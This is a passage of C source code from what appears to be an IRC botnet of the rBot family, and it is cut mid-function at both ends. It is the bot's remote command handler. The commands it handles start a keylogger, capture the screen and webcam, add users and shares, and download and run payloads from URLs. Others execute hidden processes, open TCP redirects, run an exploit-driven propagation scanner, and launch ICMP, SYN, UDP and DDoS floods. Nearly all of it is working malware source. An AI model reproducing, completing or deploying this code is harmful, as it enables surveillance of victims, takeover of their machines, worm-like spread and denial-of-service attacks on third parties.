					keylog.notice = notice;
					keylog.silent = ((strcmp("file", a[s+1]) == 0)?(true):(silent));
					strncpy(keylog.chan, ((a[s+2])?(a[s+2]):((strcmp(keylogchan,"")==0)?(a[2]):(keylogchan))), sizeof(keylog.chan));

					sprintf(sendbuf, "[KEYLOG]: Key logger active.");
					keylog.threadnum = addthread(sendbuf, KEYLOG_THREAD, NULL);
					if (threads[keylog.threadnum].tHandle = CreateThread(NULL, 0, &KeyLoggerThread, (LPVOID)&keylog, 0, &id)) {
						while(keylog.gotinfo == false)
							Sleep(50);
					} else
						sprintf(sendbuf,"[KEYLOG]: Failed to start logging thread, error: <%d>.", GetLastError());
				}
			}
			else if (strcmp("off", a[s+1]) == 0) {
				if ((i=killthreadid(KEYLOG_THREAD)) > 0)
					sprintf(sendbuf,"[KEYLOG]: Key logger stopped. (%d thread(s) stopped.)",i);
				else
					sprintf(sendbuf,"[KEYLOG]: No key logger thread found.");
			}
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif
		#ifndef NO_NET
		else if (strcmp("net", a[s]) == 0) {
			if(!(noadvapi32) && !(nonetapi32)) {
				if (x != NULL) {
					char *y = NULL;
					if (a[s+2]) // get the full service name if exists
						y = strstr(x, a[s+2]);
					if (strcmp("start", a[s+1]) == 0)
						if (a[s+2])
							sprintf(sendbuf, "%s", Services(NET_START, y));
						else {
							if (ListServices(sock, a[2], notice))
								sprintf(sendbuf, "[NET]: Service list completed.");
							else
								sprintf(sendbuf, "[NET]: Service list failed.");
						}
					else if (strcmp("stop", a[s+1]) == 0)
						sprintf(sendbuf, "%s", Services(NET_STOP, y));
					else if (strcmp("pause", a[s+1]) == 0)
						sprintf(sendbuf, "%s", Services(NET_PAUSE, y));
					else if (strcmp("continue", a[s+1]) == 0)
						sprintf(sendbuf, "%s", Services(NET_CONTINUE, y));
					else if (strcmp("delete", a[s+1]) == 0)
						sprintf(sendbuf, "%s", Services(NET_DELETE, y));
					else if (strcmp("share", a[s+1]) == 0) {
						if (a[s+2]) {
							if (parameters['d'])
								sprintf(sendbuf, "%s", Shares(NET_DELETE, a[s+2]));
							else
								sprintf(sendbuf, "%s", Shares(NET_ADD, a[s+2], a[s+3]));
						} else {
							if (ListShares(sock, a[2], notice))
								sprintf(sendbuf, "[NET]: Share list completed.");
							else
								sprintf(sendbuf, "[NET]: Share list failed.");
						}
					}
					else if (strcmp("user", a[s+1]) == 0) {
						if (a[s+2]) {
							if (parameters['d'])
								sprintf(sendbuf, "%s", Users(NET_DELETE, a[s+2], NULL, sock, a[2], notice));
							else {
								if (a[s+3])
									sprintf(sendbuf, "%s", Users(NET_ADD, a[s+2], a[s+3], sock, a[2], notice));
								else
									sprintf(sendbuf, "%s", Users(NET_INFO, a[s+2], NULL, sock, a[2], notice));
							}
						} else {
							if (ListUsers(sock, a[2], notice))
								sprintf(sendbuf, "[NET]: User list completed.");
							else
								sprintf(sendbuf, "[NET]: User list failed.");
						}
					}
					else if (strcmp("send", a[s+1]) == 0) {
						if (a[s+2])
							sprintf(sendbuf, "%s", NetSend(y, sock, a[2], notice));
						else
							sprintf(sendbuf, "[NET]: No message specified.");
					}
					else
						sprintf(sendbuf,"[NET]: Command unknown.");
				}
			} else
				sprintf(sendbuf, "[NET]: Failed to load advapi32.dll or netapi32.dll.");
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		#endif
		#ifndef NO_CAPTURE
		else if (strcmp("capture", a[s]) == 0 || strcmp("cap", a[s]) == 0) {
			if (strcmp(a[s+1],"screen") == 0) {
				if (a[s+2]) {
					if (Capture(a[s+2]) == true)
						sprintf(sendbuf,"[CAPTURE]: Screen capture saved to: %s.", a[s+2]);
					else
						sprintf(sendbuf,"[CAPTURE]: Error while capturing screen.");
				} else
					sprintf(sendbuf,"[CAPTURE]: No filename specified for screen capture.");
			}
			if (strcmp(a[s+1],"drivers") == 0) {
				char buffer[1024],svName[256], svComment[IRCLINE];

				for (i=0; i < 10; i++) {
					if(fcapGetDriverDescription(i, svName, 255, svComment, (IRCLINE-1))) {
						sprintf(buffer, "[CAPTURE]: Driver #%d - %s - %s.", i, svName, svComment);
						irc_privmsg(sock,a[2],buffer,notice);
					}
				}
				sprintf(sendbuf,"[CAPTURE]: Driver list complete.");
			}
			if (strcmp(a[s+1],"frame") == 0) {
				if (a[s+2] && a[s+3] && a[s+4] && a[s+5]) {
					if (CaptureFrame(a[s+2], atoi(a[s+3]), atoi(a[s+4]), atoi(a[s+5])) == 0)
						sprintf(sendbuf,"[CAPTURE]: Webcam capture saved to: %s.", a[s+2]);
					else
						sprintf(sendbuf,"[CAPTURE]: Error while capturing from webcam.");
				} else
					sprintf(sendbuf,"[CAPTURE]: Invalid parameters for webcam capture.");
			}
			if (strcmp(a[s+1],"video") == 0) {
				if (a[s+2] && a[s+3] && a[s+4] && a[s+5] && a[s+6]) {
					if (CaptureVideo(a[s+2], atoi(a[s+3]), atoi(a[s+4]), atoi(a[s+5]), atoi(a[s+6])) == 0)
						sprintf(sendbuf,"[CAPTURE]: Amateur video saved to: %s.", a[s+2]);
					else
						sprintf(sendbuf,"[CAPTURE]: Error while capturing amateur video from webcam.");

				} else
					sprintf(sendbuf,"[CAPTURE]: Invalid parameters for amateur video capture.");
			}
			if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
			addlog(sendbuf);

			return repeat;
		}
		#endif
		else if (strcmp("gethost", a[s]) == 0 || strcmp("gh", a[s]) == 0) { 
			if(strstr(host, a[s+1])) {
				if (a[s+2]) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], y);
						strncpy(line,  sendbuf, (IRCLINE-1));
						sprintf(sendbuf,"[MAIN]: Gethost: %s, Command: %s", a[s+1],y);
						repeat++;
					} else
						sprintf(sendbuf,"[MAIN]: Unable to extract Gethost command.");							
				} else {
					irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
					_snprintf(sendbuf,sizeof(sendbuf),"[MAIN]: Gethost: %s.",a[s+1]);
				}
				addlog(sendbuf);
			}

			return repeat;
		}

		// commands requiring at least 2 parameters
		else if (a[s+2] == NULL) return 1;
		else if (strcmp("addalias", a[s]) == 0 || strcmp("aa", a[s]) == 0) {
			if (x != NULL) {
				char *y = strstr(x, a[s+2]);
				if (y != NULL) {
					addalias(a[s+1], y);
					sprintf(sendbuf,"[MAIN]: Alias added: %s.", a[s+1]);
					if(!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}
			}

			return 1;
		}
		else if (strcmp("privmsg", a[s]) == 0 || strcmp("pm", a[s]) == 0) {
			if (x != NULL) {
				x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
				char *y = strstr(x, a[s+2]);
				if (y != NULL) {
					irc_privmsg(sock, a[s+1], y, false);
					addlogv("[MAIN]: Privmsg: %s: %s.",a[s+1], y);
				}
			}

			return repeat;
		}
		else if (strcmp("action", a[s]) == 0 || strcmp("a", a[s]) == 0) {
			if (x != NULL) {
				x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
				char *y = strstr(x, a[s+2]);
				if (y != NULL) {
					sprintf(sendbuf, "\1ACTION %s\1", y);
					irc_privmsg(sock, a[s+1], sendbuf, false);
					addlogv("[MAIN]: Action: %s: %s.",a[s+1], y);
				}
			}

			return repeat;
		}
		else if (strcmp("cycle", a[s]) == 0 || strcmp("cy", a[s]) == 0) {
			if (strcmp("332", a[1]) == 0) 
				return 1;
			irc_sendv(sock, "PART %s\r\n", a[s+2]);
			Sleep(atoi(a[s+1])*1000);
			irc_sendv(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
			addlog("[MAIN]: Cycle.");

			return repeat;
		}
		else if (strcmp("mode", a[s]) == 0 || strcmp("m", a[s]) == 0) {
			if (x != NULL) {
				char *y = strstr(x, a[s+1]);
				if (y != NULL) {
					irc_sendv(sock, "MODE %s\r\n", y);
					addlogv("[MAIN]: Mode change: %s",y);
				}
			}

			return repeat;
		}
		else if (strcmp("c_raw", a[s]) == 0 || strcmp("c_r", a[s]) == 0) {
			if (x != NULL) {
				char *y = strstr(x, a[s+2]);
				if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", y);
					addlogv("[CLONE]: Raw (%s): %s", a[s+1], y);
				}

			}

			return repeat;
		}
		else if (strcmp("c_mode", a[s]) == 0 || strcmp("c_m", a[s]) == 0) {
			if (x != NULL) {
				char *y = strstr(x, a[s+2]);
				if (y != NULL) 
					sprintf(sendbuf, "MODE %s", y);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);
					addlogv("[CLONE]: Mode (%s): %s", a[s+1], y);
				}
			}

			return repeat;
		}
		else if (strcmp("c_nick", a[s]) == 0 || strcmp("c_n", a[s]) == 0) {
			sprintf(sendbuf, "NICK %s", a[s+2]);
			if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) { 
				irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);
				addlogv("[CLONE]: Nick (%s): %s", a[s+1], a[s+2]);
			}

			return repeat;
		}
		else if (strcmp("c_join", a[s]) == 0 || strcmp("c_j", a[s]) == 0) {
			sprintf(sendbuf, "JOIN %s %s", a[s+2], a[s+3]);
			if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) 
				irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);

			return repeat;
		}
		else if (strcmp("c_part", a[s]) == 0 || strcmp("c_p", a[s]) == 0) {
			sprintf(sendbuf, "PART %s", a[s+2]);
			if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) 
				irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);

			return repeat;
		}
		else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
			if (strcmp("332", a[1]) == 0) return 1;
			if (x != NULL) {
				char *r = strstr(x, a[s+2]);
				if (strcmp(a[s+2]+1,"repeat") != 0) {
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, (IRCLINE-1));
					sprintf(sendbuf,"[MAIN]: Repeat: %s", r);
					addlog(sendbuf);

					if (atoi(a[s+1]) > 0) 
						return repeat + atoi(a[s+1]); 
					else 
						return repeat;
				} else {
					sprintf(sendbuf,"[MAIN]: Repeat not allowed in command line: %s", r);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
				}
			}

			return repeat;
		}
		else if (strcmp("delay", a[s]) == 0 || strcmp("de", a[s]) == 0) {
			if (strcmp("332", a[1]) == 0) return 1;
			if (x != NULL) {
				char *r = strstr(x, a[s+2]);
				sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
				strncpy(line,  sendbuf, 511);
				if (atoi(a[s+1]) > 0) 
					Sleep(atoi(a[s+1])*1000);
				addlog("[MAIN]: Delay.");
				return repeat + 1;
			}

			return 1;
		}
		#ifndef NO_DOWNLOAD
		else if ((strcmp("upgr4de", a[s]) == 0)) {
			if (strcmp(botid, a[s+2]) != 0 && (strcmp(a[s+3], rmpassword) == 0)) {
				char tempdir[MAX_PATH], tmpbuf[MAXNICKLEN];
				GetTempPath(sizeof(tempdir), tempdir);

				DOWNLOAD dl;
				strncpy(dl.url,  a[s+1], sizeof(dl.url)-1);
				sprintf(dl.dest, "%s%s.exe", tempdir, rndnickletter(tmpbuf));
				dl.update = 1;
				dl.run = 0;
				dl.expectedcrc=((a[s+3])?(strtoul(a[s+3],0,16)):(0));
				dl.filelen=((a[s+4])?(atoi(a[s+4])):(0));
				dl.encrypted=(parameters['e']);

				dl.sock = sock;
				strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
				dl.notice=notice;
				dl.silent = silent;

				sprintf(sendbuf, "[UPDATE]: Downloading update from: %s.", a[s+1]);
				dl.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
				if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
					while(dl.gotinfo == false)
						Sleep(50);
				} else
					sprintf(sendbuf,"[UPDATE]: Failed to start download thread, error: <%d>.", GetLastError());
			} else
				sprintf(sendbuf,"[UPDATE]: Bot ID must be different than current running process and/or wrong password.");

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		#endif
		// FIX ME: Add execute with output, rip from my IROFFER
		else if (strcmp("execu7e", a[s]) == 0) {
			if (x != NULL) {
				char *y = strstr(x, a[s+2]);
				if (y != NULL) {
					DWORD pid = CreateProc(y, NULL, (atoi(a[s+1]) == 1)?(SW_SHOW):(SW_HIDE));
					if (!pid)
					//if (!CreateProcess(NULL, y, NULL, NULL, true, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo))
						_snprintf(sendbuf, sizeof(sendbuf), "[EXEC]: Couldn't execute file.");
					else
						_snprintf(sendbuf, sizeof(sendbuf), "[EXEC]: Process ID: %d Commands: %s",pid,y);
				}
			}
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		#ifndef NO_FINDFILE
		else if (strcmp("findfile", a[s]) == 0 || strcmp("ff", a[s]) == 0) { 
			FFIND ffind;
			strncpy(ffind.filename,a[s+1],sizeof(ffind.filename));
			if (x != NULL) {
				char *y = strstr(x, a[s+2]);
				if (y != NULL) 
					strcpy(ffind.dirname,y);
			}
			strncpy(ffind.chan,a[2],sizeof(ffind.chan));
			ffind.sock = sock;
			ffind.notice = notice;
			ffind.silent = silent;

			_snprintf(sendbuf, sizeof(sendbuf),"[FINDFILE]: Searching for file: %s in: %s.", ffind.filename, ffind.dirname);
			ffind.threadnum = addthread(sendbuf, FIND_THREAD, NULL);
			if (threads[ffind.threadnum].tHandle = CreateThread(NULL, 0, &FindFileThread, (LPVOID)&ffind, 0, &id)) {
				while (ffind.gotinfo == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[FINDFILE]: Failed to start search thread, error: <%d>.", GetLastError());
			addlog(sendbuf);

			return 1;
		}
		#endif
		else if (strcmp("rename", a[s]) == 0 || strcmp("mv", a[s]) == 0) {
			if (MoveFile(a[s+1],a[s+2]))
				_snprintf(sendbuf,sizeof(sendbuf),"[FILE]: Rename: '%s' to: '%s'.", a[s+1], a[s+2]);
			else 
				_snprintf(sendbuf,sizeof(sendbuf),PrintError("[FILE]:"));

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#ifndef NO_ICMP
		else if (strcmp("icmpflood", a[s]) == 0 || strcmp("icmp", a[s]) == 0) {
			ICMPFLOOD icmpflood;
			if ((icmpflood.time = atoi(a[s+2])) > 0) {
				strncpy(icmpflood.ip,a[s+1],sizeof(icmpflood.ip));
				icmpflood.spoof = ((parameters['r'])?(true):(false));
				icmpflood.sock = sock;
				strncpy(icmpflood.chan,a[2],sizeof(icmpflood.chan));
				icmpflood.notice = notice;
				icmpflood.silent = silent;

				_snprintf(sendbuf,sizeof(sendbuf),"[ICMP]: Flooding: (%s) for %s seconds.", a[s+1], a[s+2]);
				icmpflood.threadnum = addthread(sendbuf,ICMP_THREAD,NULL);
				if (threads[icmpflood.threadnum].tHandle = CreateThread(NULL, 0, &ICMPFloodThread, (LPVOID)&icmpflood, 0, &id)) {
					while(icmpflood.gotinfo == false)
						Sleep(50);
				} else
					sprintf(sendbuf,"[ICMP]: Failed to start flood thread, error: <%d>.", GetLastError());
			} else
				sprintf(sendbuf,"[ICMP]: Invalid flood time must be greater than 0.");

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif

		// commands requiring at least 3 parameters
		else if (a[s+3] == NULL) return 1;
		else if (strcmp("clone", a[s]) == 0 || strcmp("c", a[s]) == 0) {
			IRC irc;
			strncpy(irc.host,  a[s+1], sizeof(irc.host)-1);
			irc.port = atoi(a[s+2]);
			strncpy(irc.channel,  a[s+3], sizeof(irc.channel)-1);
			if (a[s+4]) 
				strncpy(irc.chanpass,  a[s+4], sizeof(irc.chanpass)-1);
			irc.spy = 1;

			sprintf(sendbuf, "[CLONES]: Created on %s:%d, in channel %s.", irc.host, irc.port, irc.channel);
			irc.threadnum = addthread(sendbuf, CLONE_THREAD, NULL);
			if (threads[irc.threadnum].tHandle = CreateThread(NULL, 0, &irc_connect, (LPVOID)&irc, 0, &id)) {
				while(irc.gotinfo == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[CLONES]: Failed to start clone thread, error: <%d>.", GetLastError());

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		#ifndef NO_TERM
		else if (strcmp("termflood", a[s]) == 0) {
			TERMFLOOD termflood;
			strncpy(termflood.ip, a[s+1], sizeof(ddos.ip)-1);
			strncpy(termflood.port, a[s+2], sizeof(ddos.port)-1);
			termflood.type = a[s+3];
			strncpy(termflood.chan, a[2], sizeof(termflood.chan)-1);
			termflood.notice = notice;
			termflood.silent = silent;
			termflood.sock = sock;

			sprintf(sendbuf, "[TERMFLOOD]: Sending terminate messages to: %s:%s", a[s+1], a[s+2]);
			ddos.threadnum = addthread(sendbuf,TERM_THREAD,NULL);
			if (threads[termflood.threadnum].tHandle = CreateThread(NULL, 0, &TermFloodThread, (LPVOID)&termflood, 0, &id)) {
				while(termflood.gotinfo == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[TERMFLOOD]: Failed to start flood thread, error: <%d>.", GetLastError());

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif
		#ifndef NO_DDOS
		else if (strcmp("ddos.syn", a[s]) == 0 || strcmp("ddos.ack", a[s]) == 0 || strcmp("ddos.random", a[s]) == 0) {
			DDOS ddos;
			strncpy(ddos.ip, a[s+1], sizeof(ddos.ip)-1);
			strncpy(ddos.port, a[s+2], sizeof(ddos.port)-1);
			strncpy(ddos.length, a[s+3], sizeof(ddos.length)-1);
			strncpy(ddos.chan, a[2], sizeof(ddos.chan)-1);
			strncpy(ddos.type,a[s],32);
			ddos.notice = notice;
			ddos.silent = silent;
			ddos.sock = sock;

			sprintf(sendbuf, "[DDoS]: Flooding: (%s:%s) for %s seconds.", a[s+1], a[s+2], a[s+3]);
			ddos.threadnum = addthread(sendbuf,DDOS_THREAD,NULL);
			if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSThread, (LPVOID)&ddos, 0, &id)) {
				while(ddos.gotinfo == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif

		#ifndef NO_SYN
		else if (strcmp("synflood", a[s]) == 0 || strcmp("syn", a[s]) == 0) {
			SYNFLOOD synflood;
			strncpy(synflood.ip, a[s+1], sizeof(synflood.ip)-1);
			strncpy(synflood.port, a[s+2], sizeof(synflood.port)-1);
			strncpy(synflood.length, a[s+3], sizeof(synflood.length)-1);
			strncpy(synflood.chan, a[2], sizeof(synflood.chan)-1);
			synflood.notice = notice;
			synflood.silent = silent;
			synflood.sock = sock;

			sprintf(sendbuf, "[SYN]: Flooding: (%s:%s) for %s seconds.", a[s+1], a[s+2], a[s+3]);
			synflood.threadnum = addthread(sendbuf,SYN_THREAD,NULL);
			if (threads[synflood.threadnum].tHandle = CreateThread(NULL, 0, &SynFloodThread, (LPVOID)&synflood, 0, &id)) {
				while(synflood.gotinfo == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[SYN]: Failed to start flood thread, error: <%d>.", GetLastError());

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif
		#ifndef NO_DOWNLOAD
		else if (strcmp("retr1eve", a[s]) == 0) {
			DOWNLOAD dl;
			strncpy(dl.url, a[s+1], sizeof(dl.url)-1);
			strncpy(dl.dest, a[s+2], sizeof(dl.dest)-1);
			dl.update = 0;
			dl.run = ((a[s+3])?(atoi(a[s+3])):(0));
			dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
			dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
			dl.encrypted=(parameters['e']);

			dl.sock = sock;
			strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
			dl.notice=notice;
			dl.silent = silent;

			sprintf(sendbuf, "[DOWNLOAD]: Downloading URL: %s to: %s.", a[s+1], a[s+2]);
			dl.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
			if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
				while(dl.gotinfo == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[DOWNLOAD]: Failed to start transfer thread, error: <%d>.", GetLastError());

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif
		#ifndef NO_REDIRECT
		else if (strcmp("redirect", a[s]) == 0 || strcmp("rd", a[s]) == 0) {
			REDIRECT redirect;
			redirect.lport = atoi(a[s+1]);
			strncpy(redirect.dest,  a[s+2], sizeof(redirect.dest)-1);
			redirect.port = atoi(a[s+3]);
			redirect.sock = sock;
			strncpy(redirect.chan,a[2],sizeof(redirect.chan));
			redirect.notice = notice;
			redirect.silent = silent;

			sprintf(sendbuf, "[REDIRECT]: TCP redirect created from: %s:%d to: %s:%d.", GetIP(sock), redirect.lport, redirect.dest, redirect.port);
			redirect.threadnum = addthread(sendbuf,REDIRECT_THREAD,NULL);
			if (threads[redirect.threadnum].tHandle = CreateThread(NULL, 0, &RedirectThread, (LPVOID)&redirect, 0, &id)) {
				while(redirect.gotinfo == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[REDIRECT]: Failed to start redirection thread, error: <%d>.", GetLastError());

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif 
		#ifndef NO_SCAN
		else if (strcmp("p0rtscan", a[s]) == 0) {
			SCAN scan;
			scan.addy.s_addr = finet_addr(a[s+1]);
			scan.port = atoi(a[s+2]);
			scan.delay = atoi(a[s+3]);
			scan.sock = sock;
			strncpy(scan.chan,  a[2], sizeof(scan.chan)-1);
			scan.notice = notice;
			scan.silent = silent;

			sprintf(sendbuf, "[SCAN]: Port scan started: %s:%d with delay: %d(ms).", finet_ntoa(scan.addy), scan.port, scan.delay);
			scan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
			if (threads[scan.threadnum].tHandle = CreateThread(NULL, 0, &ScanThread, (LPVOID)&scan, 0, &id)) {
				while(scan.gotinfo == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[SCAN]: Failed to start scan thread, error: <%d>.", GetLastError());

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif 
		else if (strcmp("c_privmsg", a[s]) == 0 || strcmp("c_pm", a[s]) == 0) {
			if (threads[atoi(a[s+1])].nick[0] != '\0' && x != NULL) {
				x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
				char *y = strstr(x, a[s+3]);
				if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					irc_privmsg(threads[atoi(a[s+1])].sock, a[s+2], y, false);
					if (threads[atoi(a[s+1])].name[0] == 's') {
						sprintf(sendbuf, "[%s] <%s> %s", a[s+2], threads[atoi(a[s+1])].nick, y);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}

			return repeat;
		}
		else if (strcmp("c_action", a[s]) == 0 || strcmp("c_a", a[s]) == 0) {
			if (threads[atoi(a[s+1])].nick[0] != '\0' && x != NULL) {
				x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
				char *y = strstr(x, a[s+3]);
				sprintf(sendbuf, "\1ACTION %s\1", y);
				if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					irc_privmsg(threads[atoi(a[s+1])].sock, a[s+2], sendbuf, false);
					if (threads[atoi(a[s+1])].name[0] == 's') {
						sprintf(sendbuf, "[%s] * %s %s", a[s+2], threads[atoi(a[s+1])].nick, y);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}

			return repeat;
		}

		// commands requiring at least 4 parameters
		else if (a[s+4] == NULL) return 1;
		#ifndef NO_ADVSCAN
		else if (strcmp("4dvsc4n", a[s]) == 0 || strcmp("4sc", a[s]) == 0) {
			int scanthreads=findthreadid(SCAN_THREAD);
			if (scanthreads + atoi(a[s+2]) > MAXSCANTHRD) {
				sprintf(sendbuf ,"[SCAN]: Already %d scanning threads. Too many specified.", scanthreads);
				irc_privmsg(sock,a[2],sendbuf,notice);
			} else {
				ADVSCAN advscan;
				advscan.port = atoi(a[s+1]); // check for method or port number
				advscan.threads = atoi(a[s+2]);
				advscan.delay = atoi(a[s+3]);
				advscan.delay = ((advscan.delay < 3)?(3):(advscan.delay));
				advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
				advscan.minutes = atoi(a[s+4]);
				advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));

				advscan.exploit = -1;
				for(i=0;exploit[i].port != 0;i++) {
					if (strcmp(exploit[i].command, a[s+1]) == 0) {
						advscan.port = exploit[i].port;
						advscan.exploit = i;

						break;
					}
				}

				if (advscan.port == 0) {
					sprintf(sendbuf, "[SCAN]: Failed to start scan, port is invalid.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);

					return 1;
				}

				if (a[s+5] && a[s+5][0] != '#') {
					strncpy(advscan.ip,a[s+5],sizeof(advscan.ip));
					strncpy(advscan.myip,GetIP(sock),sizeof(advscan.myip));
					advscan.random = ((strchr(a[s+5],'x'))?(true):(false));
				} else {
					if (parameters['a'] || parameters['b'] || parameters['r']) {
						if (parameters['e']) { /*e = external ip*/
							IN_ADDR in;

							in.s_addr=ResolveAddress(host);
							strncpy(advscan.myip,finet_ntoa(in), sizeof(advscan.myip));

							in.s_addr&=(parameters['a'])?(0xFF):(0xFFFF);
							strncpy(advscan.ip,finet_ntoa(in), sizeof(advscan.ip));
						} else {
							//both ways work
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
							strncpy(advscan.myip,finet_ntoa(ssin.sin_addr), sizeof(advscan.myip));

							ssin.sin_addr.S_un.S_addr&=(parameters['a'])?(0xFF):(0xFFFF);
							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

							/*char *ip = GetIP(sock), advip[16]; int ip1=-1,ip2=-1;
							sscanf(ip,"%d.%d",&ip1,&ip2);
							if (parameters['a']) sprintf(advip, "%d.0.0.0", ip1); else sprintf(advip, "%d.%d.0.0", ip1, ip2);
							strncpy(advscan.ip,advip, sizeof(advscan.ip));*/

						}


						if (parameters['r']) {
							int extractip = ((parameters['a']) ? 3 : 2);
							/*converts '0' to 'x's*/
							for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);

							advscan.random = true;
						} else
							advscan.random = false;
					} else {
						sprintf(sendbuf, "[SCAN]: Failed to start scan, no IP specified.");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);

						return 1;
					}
				}

				advscan.sock = sock;
				advscan.notice = notice;
				advscan.silent = silent;
				strncpy(advscan.chan,a[2],sizeof(advscan.chan));
				if (a[s+6])
					strncpy(advscan.msgchan,a[s+6],sizeof(advscan.msgchan));
				else if (a[s+5] && a[s+5][0] == '#')
					strncpy(advscan.msgchan,a[s+5],sizeof(advscan.msgchan));
				else if (strcmp(exploitchan,"") != 0)
					strncpy(advscan.msgchan,exploitchan,sizeof(advscan.msgchan));
				else
					advscan.msgchan[0] = '\0';

				sprintf(sendbuf, "[SCAN]: %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", 
					((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
				advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
				if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
					while(advscan.gotinfo == false)
						Sleep(50);
				} else
					sprintf(sendbuf,"[SCAN]: Failed to start scan thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
		}
		#endif
		#ifndef NO_UDP
		else if (strcmp("udpflood", a[s]) == 0 || strcmp("udp", a[s]) == 0 || strcmp("u", a[s]) == 0) {
			PINGFLOOD udps;
			udps.silent = silent;
			udps.notice = notice;
			strncpy(udps.host,  a[s+1], sizeof(udps.host)-1);
			udps.num = atoi(a[s+2]);
			udps.size = atoi(a[s+3]);
			udps.delay = atoi(a[s+4]);
			if (a[s+5] != NULL) 
				udps.port = atoi(a[s+5]); 
			else 
				udps.port = 0;
			strncpy(udps.chan,  a[2], sizeof(udps.chan)-1);
			udps.sock = sock;

